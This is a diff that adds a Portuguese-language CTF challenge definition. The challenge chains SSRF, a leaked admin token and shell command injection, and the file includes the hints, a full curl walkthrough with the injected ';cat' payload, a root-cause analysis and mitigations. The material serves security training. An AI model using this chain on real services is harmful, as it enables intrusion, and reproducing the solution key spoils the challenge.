@@ -1,0 +1,35 @@
+{
+  "slug": "chain-ssrf-internal",
+  "title": "A corrente da lâmpada",
+  "codename": "LAMPWORK",
+  "summary": "Um único SSRF percorre o perímetro de serviços: o fetcher adiciona uma identidade interna, o endpoint de chaves entrega um token de admin e o console de admin executa diagnósticos com a conta de serviço. Três trust boundaries, uma corrente.",
+  "category": "chain",
+  "difficulty": "insane",
+  "kind": "challenge",
+  "lab_dir": "chain-ssrf-internal",
+  "estimated_minutes": 40,
+  "xp": 600,
+  "tech": ["Flask", "SSRF", "Shell", "HTTP"],
+  "tags": ["chaining", "ssrf", "internal-service", "command-injection", "insane"],
+  "story": "O Lampwork é um pequeno control plane para sensores de campo. O fetcher, o serviço de chaves e os diagnósticos de admin foram escritos por três times. Cada um valida o que o time anterior mandou validar. O insight não está em uma única request; está na sequência.",
+  "objective": "Use SSRF para alcançar o serviço interno de chaves, recupere o token de admin, autorize seu acesso ao console de admin e explore o shell de diagnósticos para ler a flag de root.",
+  "rules": "Fique na origem loopback atribuída. Cada etapa é HTTP real contra o mesmo processo do lab.",
+  "flags": [
+    {"key": "flag", "label": "Flag de root", "flag_type": "root", "points": 600, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "O fetcher confia em você mais do que deveria", "body": "`/fetch?url=` busca qualquer URL http(s) e adiciona `X-Internal-Proxy`. Requests diretas para `/internal/keys` sem esse header retornam 403. Tente buscar a URL interna através do fetcher.", "cost": 35},
+    {"level": 2, "title": "Chaves viram tokens", "body": "O serviço de chaves retorna um `admin_token`. `/admin` exige `X-Admin-Token` com esse valor. Essa é a segunda etapa; leia `/admin` depois de enviar o header.", "cost": 45},
+    {"level": 3, "title": "O console tem um shell", "body": "`/admin/diag` roda `getent hosts <host>` via `/bin/sh` e retorna a saída. A flag está em `/tmp/redvault-chain-flag.txt`. Injete `; cat /tmp/redvault-chain-flag.txt`. O objetivo é registrado quando a flag é lida.", "cost": 60}
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — SSRF.** `GET /internal/keys` direto → 403. `GET /fetch?url=http://127.0.0.1:PORT/internal/keys` funciona porque o fetcher adiciona `X-Internal-Proxy`. A resposta inclui `admin_token`.\n\n**Etapa 2 — admin.** `GET /admin` com `X-Admin-Token: <token>` retorna o formulário de diagnósticos.\n\n**Etapa 3 — execução de comandos.** `POST /admin/diag` com `host=127.0.0.1; cat /tmp/redvault-chain-flag.txt`. A saída contém a flag de root.\n\n```bash\ncurl 'http://127.0.0.1:PORT/fetch?url=http://127.0.0.1:PORT/internal/keys'\ncurl -H 'X-Admin-Token: TOKEN' http://127.0.0.1:PORT/admin\ncurl -H 'X-Admin-Token: TOKEN' -d 'host=127.0.0.1; cat /tmp/redvault-chain-flag.txt' http://127.0.0.1:PORT/admin/diag\n```",
+    "root_cause": "Três componentes individualmente razoáveis se combinam em comprometimento total: o fetcher anexa uma identidade privilegiada a URLs arbitrárias, o serviço de chaves confia nesse header como prova de rede e o console de admin passa um hostname para um shell. Cada etapa baixa a barreira para a seguinte.",
+    "mitigation": "Trate a identidade interna como credencial autenticada de serviço a serviço, nunca como um header que qualquer proxy pode anexar; restrinja os fetches a uma allow-list explícita de hosts após a resolução DNS; armazene tokens de admin somente no servidor; e execute diagnósticos com argumentos fixos e `shell=False` sob uma conta restrita."
+  },
+  "references": [
+    {"title": "PortSwigger — Server-side request forgery", "url": "https://portswigger.net/web-security/ssrf", "source_type": "official", "description": "Correntes de SSRF até serviços internos."},
+    {"title": "OWASP — OS Command Injection Defense Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html", "source_type": "standard", "description": "Execução segura de argumentos."},
+    {"title": "MITRE ATT&CK — T1190 Exploit Public-Facing Application", "url": "https://attack.mitre.org/techniques/T1190/", "source_type": "standard", "description": "Acesso inicial por meio de serviços públicos exploráveis."}
+  ]
+}
